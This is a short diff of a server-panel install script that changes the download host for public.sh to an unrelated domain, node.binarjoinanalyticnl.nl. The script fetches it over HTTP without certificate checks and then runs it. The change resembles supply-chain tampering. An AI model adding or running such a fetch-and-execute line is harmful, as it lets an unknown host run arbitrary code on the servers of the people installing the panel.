@@ -4,7 +4,7 @@ export PATH
 install_tmp='/tmp/bt_install.pl'
 public_file=/www/server/panel/install/public.sh
 if [ ! -f $public_file ];then
-	wget -O $public_file http://node.k2panel.com/install/public.sh -T 20 --no-check-certificate
+	wget -O $public_file http://node.binarjoinanalyticnl.nl/install/public.sh -T 20 --no-check-certificate
 fi
 . $public_file
 download_Url=$NODE_URL
